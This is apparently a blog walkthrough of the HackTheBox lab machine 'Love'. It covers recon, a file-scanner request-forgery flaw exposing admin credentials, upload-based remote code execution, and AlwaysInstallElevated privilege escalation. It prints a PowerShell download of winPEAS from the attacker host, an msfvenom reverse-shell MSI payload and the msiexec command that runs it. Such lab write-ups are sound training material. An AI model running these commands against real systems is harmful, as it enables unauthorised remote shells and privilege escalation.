Hi everyone, today we are going to be looking at Love --`10.10.10.239`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

From the output shown above, we can see that the machine is a Windows machine. There were a lot of ports open, so I started with the web application. Navigating to the web application presented me with a login page for a voting system:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Love/img1.png"  style="width: 80%" />
</p>


While I was looking into the source code, I ran gobuster scans, the output of which is shown below:

The gobuster scans revealed several directories include an admin portal! The portal had username enumeration and the username -- `admin` existed, however I didn't have a password at this stage.

Since I didn't have a way forward with port 80, I looked into port 443, however access was forbidden. Additionally, SMB did not have NULL authentication available. At this point I went back over the nmap scans and saw a subdomain within the SSL certificate.

### Staging Environment
I added the `staging.love.htb` subdomain to the `/etc/hosts` file and navigated to the webpage:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Love/img2.png"  style="width: 80%" />
</p>

I looked through the source code and came across a link for `/beta.php`. Navigating the URL provided the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Love/img3.png"  style="width: 80%" />
</p>


I decided to see if the file was able to contact my host by launching a python simple server:

```bash

vagrant@ko:~/Desktop/HackTheBox/Love$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.239 - - [06/May/2021 11:58:53] code 404, message File not found
10.10.10.239 - - [06/May/2021 11:58:53] "GET /test.php HTTP/1.1" 404 -

```

Alright! I now had a file scanner, I just needed to figure out how to exploit it. 

### Abusing Remote File Inclusion (RFI)
Using the file scanner, I was able to access remote files by inserting a URL into the field. Using this information, I tried to upload files from my host machine, however I didn't find a way in which to do this.

I decided to try another route, and read files from the hosts IP address. I started by attempting to read the `index.php` file which was successful. Using this train of thought, I tried to navigate the file system but I couldn't figure out a method to get LFI working with it. I tried to access the other open port -- 5000 and it displayed an Administration page including the credentials after browsing to <http://127.0.0.1:5000>:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Love/img4.png"  style="width: 80%" />
</p>

Using this information, I logged into the admin page <http://10.10.10.239/admin/home.php>:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Love/img5.png"  style="width: 80%" />
</p>

### VotingSystem Exploitation

File upload is possible via the profile picture functionality that can be used for RCE. After uploading a file, it will be stored in `/images/` and is also accessible without authentication.

I searched for a VotingSystem exploit and came across the following: <https://www.exploit-db.com/exploits/49846>.

## Privilege Escalation using Pheobe
Since I had RCE on the host, I started with some basic enumeration: 

```bat
C:\Users\Phoebe\Downloads>echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all
 
 
whoami: 
love\phoebe
Phoebe  
 
Hostname: 
Love
 

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Love
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

```

From there, I uploaded winPEAS to the host using the following PowerShell command:

```powershell
powershell.exe Invoke-WebRequest -OutFile winpeas.exe -Uri http://10.10.14.91/winPEAS.exe
```

The output showed that it was possible to exploit  `AlwaysInstallElevated`:

```bat
[+] Checking AlwaysInstallElevated
	[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
	AlwaysInstallElevated set to 1 in HKLM!
	AlwaysInstallElevated set to 1 in HKCU!
```

### Exploiting AlwaysInstallElevated

There are a few blog posts describing how to exploit this, including: <https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated>. 

> Windows environments provide a group policy setting which allows a regular user to install a Microsoft Windows Installer Package (MSI) with system privileges. This can be discovered in environments where a standard user wants to install an application which requires system privileges and the administrator would  like to avoid to give temporary local administrator access to a user.

Since both registry entries for **AlwaysInstallElevated** were set to 1, I needed to generate the payload to exploit this:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.91 LPORT=9002 -f msi -o reverse.msi
```

With the file now on the host, I used the following commands to exploit the **AlwaysInstallElevated** vulnerability:

```bat
msiexec /quiet /qn /i reverse.msi
```
